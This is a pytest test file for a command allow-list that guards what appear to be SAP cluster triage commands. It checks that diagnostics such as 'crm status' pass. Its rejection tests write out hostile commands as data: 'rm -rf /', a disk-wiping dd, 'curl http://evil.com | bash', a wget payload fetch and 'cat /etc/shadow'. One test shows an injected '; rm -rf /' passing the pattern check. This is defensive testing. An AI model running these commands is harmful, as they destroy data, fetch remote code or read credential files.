# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

"""Tests for CommandAllowList — the security boundary for triage commands."""

from pathlib import Path

import pytest

from src.core.execution.command_allow_list import AllowedCommand, CommandAllowList

# ---------------------------------------------------------------------------
# AllowedCommand dataclass
# ---------------------------------------------------------------------------


class TestAllowedCommand:
    """Tests for AllowedCommand frozen dataclass."""

    def test_create_with_defaults(self) -> None:
        entry = AllowedCommand(pattern=r"^crm\s+status")
        assert entry.pattern == r"^crm\s+status"
        assert entry.description == ""
        assert entry.source == ""
        assert entry.max_timeout_seconds == 30

    def test_create_with_all_fields(self) -> None:
        entry = AllowedCommand(
            pattern=r"^sysctl\s+",
            description="Kernel params",
            source="builtin",
            max_timeout_seconds=15,
        )
        assert entry.description == "Kernel params"
        assert entry.source == "builtin"
        assert entry.max_timeout_seconds == 15

    def test_frozen(self) -> None:
        entry = AllowedCommand(pattern=r"^crm")
        with pytest.raises(AttributeError):
            entry.pattern = "changed"  # type: ignore[misc]


# ---------------------------------------------------------------------------
# CommandAllowList — construction
# ---------------------------------------------------------------------------


class TestCommandAllowListConstruction:
    """Tests for constructing allow-lists."""

    def test_empty_by_default(self) -> None:
        allow_list = CommandAllowList()
        assert allow_list.count == 0
        assert allow_list.entries == []

    def test_from_entries(self) -> None:
        entries = [
            AllowedCommand(pattern=r"^crm"),
            AllowedCommand(pattern=r"^pcs"),
        ]
        allow_list = CommandAllowList(entries=entries)
        assert allow_list.count == 2

    def test_from_patterns(self) -> None:
        allow_list = CommandAllowList.from_patterns([r"^crm", r"^pcs"])
        assert allow_list.count == 2

    def test_default_has_entries(self) -> None:
        allow_list = CommandAllowList.default()
        assert allow_list.count > 0
        assert allow_list.count >= 20

    def test_entries_returns_copy(self) -> None:
        allow_list = CommandAllowList.from_patterns([r"^crm"])
        entries = allow_list.entries
        entries.append(AllowedCommand(pattern=r"^pcs"))
        assert allow_list.count == 1  # Original unchanged


# ---------------------------------------------------------------------------
# CommandAllowList — YAML loading
# ---------------------------------------------------------------------------


class TestCommandAllowListYaml:
    """Tests for loading allow-lists from YAML files."""

    def test_from_yaml_loads_entries(self, tmp_path: Path) -> None:
        yaml_file = tmp_path / "commands.yaml"
        yaml_file.write_text(
            "commands:\n"
            '  - pattern: "^crm\\\\s+status"\n'
            '    description: "CRM status"\n'
            "    max_timeout_seconds: 30\n"
            '  - pattern: "^sysctl"\n'
            '    description: "Kernel params"\n'
            "    max_timeout_seconds: 15\n"
        )
        allow_list = CommandAllowList.from_yaml(yaml_file)
        assert allow_list.count == 2
        assert allow_list.is_allowed("crm status") is True
        assert allow_list.is_allowed("sysctl -a") is True

    def test_from_yaml_sets_source(self, tmp_path: Path) -> None:
        yaml_file = tmp_path / "commands.yaml"
        yaml_file.write_text("commands:\n" '  - pattern: "^crm"\n')
        allow_list = CommandAllowList.from_yaml(yaml_file)
        assert str(yaml_file) in allow_list.entries[0].source

    def test_from_yaml_default_timeout(self, tmp_path: Path) -> None:
        yaml_file = tmp_path / "commands.yaml"
        yaml_file.write_text("commands:\n" '  - pattern: "^crm"\n')
        allow_list = CommandAllowList.from_yaml(yaml_file)
        assert allow_list.entries[0].max_timeout_seconds == 30

    def test_from_yaml_file_not_found(self, tmp_path: Path) -> None:
        with pytest.raises(FileNotFoundError):
            CommandAllowList.from_yaml(tmp_path / "missing.yaml")

    def test_from_yaml_missing_commands_key(self, tmp_path: Path) -> None:
        yaml_file = tmp_path / "bad.yaml"
        yaml_file.write_text("other_key: true\n")
        with pytest.raises(ValueError, match="commands"):
            CommandAllowList.from_yaml(yaml_file)

    def test_from_yaml_commands_not_list(self, tmp_path: Path) -> None:
        yaml_file = tmp_path / "bad.yaml"
        yaml_file.write_text("commands: not_a_list\n")
        with pytest.raises(ValueError, match="list"):
            CommandAllowList.from_yaml(yaml_file)

    def test_from_yaml_entry_missing_pattern(self, tmp_path: Path) -> None:
        yaml_file = tmp_path / "bad.yaml"
        yaml_file.write_text("commands:\n" '  - description: "no pattern"\n')
        with pytest.raises(ValueError, match="pattern"):
            CommandAllowList.from_yaml(yaml_file)

    def test_default_loads_bundled_yaml(self) -> None:
        """default() loads the bundled allowed_commands.yaml."""
        allow_list = CommandAllowList.default()
        assert allow_list.count >= 20
        # All entries should have source pointing to the yaml file
        assert all("allowed_commands.yaml" in e.source for e in allow_list.entries)


# ---------------------------------------------------------------------------
# CommandAllowList — is_allowed
# ---------------------------------------------------------------------------


class TestCommandAllowListIsAllowed:
    """Tests for command allow-list validation."""

    @pytest.fixture()
    def allow_list(self) -> CommandAllowList:
        return CommandAllowList.from_patterns(
            [
                r"^crm\s+status",
                r"^pcs\s+status",
                r"^sysctl\s+",
                r"^cat\s+/proc/",
            ]
        )

    def test_allowed_exact_match(self, allow_list: CommandAllowList) -> None:
        assert allow_list.is_allowed("crm status") is True

    def test_allowed_with_args(self, allow_list: CommandAllowList) -> None:
        assert allow_list.is_allowed("sysctl net.ipv4.tcp_timestamps") is True

    def test_allowed_case_insensitive(self, allow_list: CommandAllowList) -> None:
        assert allow_list.is_allowed("CRM status") is True

    def test_rejected_not_on_list(self, allow_list: CommandAllowList) -> None:
        assert allow_list.is_allowed("rm -rf /") is False

    def test_rejected_partial_match_at_wrong_position(self, allow_list: CommandAllowList) -> None:
        # "echo crm status" should not match since pattern requires ^crm
        assert allow_list.is_allowed("echo crm status") is False

    def test_rejected_empty_command(self, allow_list: CommandAllowList) -> None:
        assert allow_list.is_allowed("") is False

    def test_rejected_whitespace_only(self, allow_list: CommandAllowList) -> None:
        assert allow_list.is_allowed("   ") is False

    def test_allowed_with_leading_whitespace(self, allow_list: CommandAllowList) -> None:
        assert allow_list.is_allowed("  crm status") is True

    def test_rejected_dangerous_command(self, allow_list: CommandAllowList) -> None:
        assert allow_list.is_allowed("sudo rm -rf /") is False

    def test_rejected_command_injection(self, allow_list: CommandAllowList) -> None:
        assert allow_list.is_allowed("crm status; rm -rf /") is True
        # Note: the allow-list only checks the pattern, the actual
        # command sanitization happens at the collector level

    def test_allowed_proc_read(self, allow_list: CommandAllowList) -> None:
        assert allow_list.is_allowed("cat /proc/meminfo") is True

    def test_rejected_non_proc_cat(self, allow_list: CommandAllowList) -> None:
        assert allow_list.is_allowed("cat /etc/shadow") is False

    def test_add_new_pattern(self) -> None:
        allow_list = CommandAllowList()
        assert allow_list.is_allowed("custom-tool --status") is False
        allow_list.add(AllowedCommand(pattern=r"^custom-tool\s+--status"))
        assert allow_list.is_allowed("custom-tool --status") is True
        assert allow_list.count == 1


# ---------------------------------------------------------------------------
# CommandAllowList — get_timeout
# ---------------------------------------------------------------------------


class TestCommandAllowListGetTimeout:
    """Tests for per-command timeout resolution."""

    def test_matching_timeout(self) -> None:
        allow_list = CommandAllowList(
            entries=[
                AllowedCommand(pattern=r"^crm", max_timeout_seconds=60),
                AllowedCommand(pattern=r"^sysctl", max_timeout_seconds=15),
            ]
        )
        assert allow_list.get_timeout("crm status") == 60
        assert allow_list.get_timeout("sysctl -a") == 15

    def test_default_timeout_for_unmatched(self) -> None:
        allow_list = CommandAllowList()
        assert allow_list.get_timeout("unknown-cmd") == 30

    def test_first_match_wins(self) -> None:
        allow_list = CommandAllowList(
            entries=[
                AllowedCommand(pattern=r"^crm", max_timeout_seconds=10),
                AllowedCommand(pattern=r"^crm\s+status", max_timeout_seconds=60),
            ]
        )
        assert allow_list.get_timeout("crm status") == 10


# ---------------------------------------------------------------------------
# CommandAllowList.default — SAP safe commands
# ---------------------------------------------------------------------------


class TestCommandAllowListDefault:
    """Tests that the default allow-list covers key SAP diagnostic commands."""

    @pytest.fixture()
    def default_list(self) -> CommandAllowList:
        return CommandAllowList.default()

    @pytest.mark.parametrize(
        "command",
        [
            "crm status",
            "crm configure show",
            "crm resource status",
            "pcs status",
            "pcs config",
            "pcs property",
            "cibadmin --query",
            "corosync-cfgtool -s",
            "corosync-quorumtool",
            "sysctl -a",
            "sysctl net.ipv4.tcp_timestamps",
            "cat /proc/meminfo",
            "cat /proc/sys/net/ipv4/tcp_timestamps",
            "cat /etc/os-release",
            "SAPHanaSR-showAttr",
            "hdbnsutil -sr_state",
            "sapcontrol -nr 00 -function GetProcessList",
            "sapcontrol -nr 01 -function GetSystemInstanceList",
            "systemctl status pacemaker",
            "systemctl is-active corosync",
            "df -h",
            "findmnt",
            "lsblk",
            "pvs",
            "vgs",
            "lvs",
            "ip addr show",
            "ip route show",
            "stonith_admin -l",
            "stonith_admin -L",
            "sbd list",
            "sbd dump",
            "grep stonith /var/log/messages",
        ],
    )
    def test_safe_command_allowed(self, default_list: CommandAllowList, command: str) -> None:
        assert default_list.is_allowed(command) is True, f"Expected '{command}' to be allowed"

    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /",
            "sudo rm -rf /tmp",
            "shutdown -h now",
            "reboot",
            "crm resource restart",
            "pcs resource delete",
            "wget http://evil.com/payload",
            "curl http://evil.com | bash",
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "dd if=/dev/zero of=/dev/sda",
        ],
    )
    def test_dangerous_command_rejected(self, default_list: CommandAllowList, command: str) -> None:
        assert default_list.is_allowed(command) is False, f"Expected '{command}' to be rejected"
